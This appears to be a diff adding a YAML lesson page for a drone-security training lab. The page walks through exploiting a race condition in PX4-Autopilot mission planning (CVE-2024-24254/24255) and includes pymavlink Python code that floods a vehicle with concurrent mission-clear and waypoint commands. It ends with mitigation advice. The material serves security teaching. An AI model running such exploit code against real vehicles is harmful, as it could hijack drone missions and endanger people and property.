@@ -1,0 +1,149 @@
+title: Race Condition in Mission Planning (CVE-2024-24254, CVE-2024-24255)
+order: 13
+description: Exploiting race conditions in mission planning to execute unauthorized commands
+difficulty: advanced
+estimated_time: 75
+prerequisites:
+  - waypoint-injection
+  - mavlink-command-injection
+tools_required:
+  - pymavlink
+  - Python 3
+  - Multi-threading capabilities
+cve_references:
+  - CVE-2024-24254
+  - CVE-2024-24255
+breadcrumb:
+  - text: Attack Scenarios
+    link: /attacks
+  - text: Injection
+  - text: Race Condition in Mission Planning
+
+sections:
+  - title: Description
+    content: |
+      CVE-2024-24254 and CVE-2024-24255 are race condition vulnerabilities in PX4-Autopilot's mission planning system. 
+      These vulnerabilities occur when multiple mission planning operations are executed concurrently without proper 
+      synchronization. An attacker can exploit these race conditions to inject unauthorized commands or modify mission 
+      parameters during critical operations, leading to unauthorized command execution.<br><br>
+
+      **CVSS Score**: Not specified (HIGH severity)<br>
+      **Affected**: PX4-Autopilot<br>
+      **Impact**: Unauthorized command execution, mission manipulation
+
+  - title: Resources
+    content:
+      - text: CVE-2024-24254
+        link: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-24254
+      - text: CVE-2024-24255
+        link: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-24255
+      - text: PX4 Mission Planning
+        link: https://docs.px4.io/main/en/flight_modes/mission.html
+
+  - title: Solution Guide
+    collapsible: true
+    steps:
+      - title: Step 1. Understand Race Condition
+        description: |
+          Race conditions occur when multiple threads or processes access shared resources concurrently without 
+          proper synchronization. In mission planning, this can happen when:
+          - Mission upload and mission execution occur simultaneously
+          - Multiple waypoint modifications happen concurrently
+          - Mission validation and mission execution overlap
+
+      - title: Step 2. Identify Timing Windows
+        description: |
+          Identify the critical timing windows where race conditions can be exploited. These typically occur 
+          during mission upload, waypoint modification, or mission validation phases.
+
+      - title: Step 3. Set Up Concurrent Attack
+        description: |
+          Create a script that sends multiple mission-related commands concurrently to trigger the race condition.
+          ```python
+          from pymavlink import mavutil
+          import threading
+          import time
+
+          master = mavutil.mavlink_connection('udp:127.0.0.1:14550')
+          master.wait_heartbeat()
+
+          def send_mission_clear():
+              # Clear mission
+              master.mav.mission_clear_all_send(
+                  master.target_system,
+                  master.target_component
+              )
+
+          def send_mission_item(seq, lat, lon, alt):
+              # Send mission item
+              master.mav.mission_item_send(
+                  master.target_system,
+                  master.target_component,
+                  seq,
+                  mavutil.mavlink.MAV_FRAME_GLOBAL_RELATIVE_ALT,
+                  mavutil.mavlink.MAV_CMD_NAV_WAYPOINT,
+                  0, 1, 0, 0, 0, 0,
+                  lat, lon, alt
+              )
+          ```
+
+      - title: Step 4. Execute Race Condition Attack
+        description: |
+          Launch multiple threads that send conflicting mission commands simultaneously.
+          ```python
+          # Thread 1: Clear mission
+          thread1 = threading.Thread(target=send_mission_clear)
+          
+          # Thread 2: Add waypoint
+          thread2 = threading.Thread(target=send_mission_item, 
+                                    args=(0, 37.0, -122.0, 50))
+          
+          # Thread 3: Add another waypoint
+          thread3 = threading.Thread(target=send_mission_item,
+                                    args=(1, 38.0, -123.0, 100))
+          
+          # Start all threads simultaneously
+          thread1.start()
+          time.sleep(0.001)  # Small delay to increase race condition probability
+          thread2.start()
+          thread3.start()
+          
+          thread1.join()
+          thread2.join()
+          thread3.join()
+          ```
+
+      - title: Step 5. Monitor System State
+        description: |
+          Monitor the target system to detect if the race condition was successfully exploited. Look for:
+          - Unexpected mission state
+          - Unauthorized waypoints
+          - System instability
+          - Command execution outside expected flow
+
+      - title: Step 6. Exploit Timing Window
+        description: |
+          Fine-tune the timing between concurrent operations to maximize the probability of exploiting the race condition. 
+          This may require multiple attempts with different timing intervals.
+
+      - title: Step 7. Inject Malicious Commands
+        description: |
+          Once the race condition is triggered, inject malicious commands during the vulnerable window to achieve 
+          unauthorized command execution.
+
+      - title: Step 8. Verify Exploitation
+        description: |
+          Verify that unauthorized commands were executed by checking:
+          - Mission waypoints
+          - Flight mode changes
+          - Parameter modifications
+          - System logs
+
+  - title: Mitigation
+    content: |
+      - Implement proper locking mechanisms in mission planning code
+      - Use atomic operations for critical sections
+      - Add input validation and state checking
+      - Implement transaction-like behavior for mission operations
+      - Update to patched versions of PX4-Autopilot
+      - Monitor for concurrent mission operations
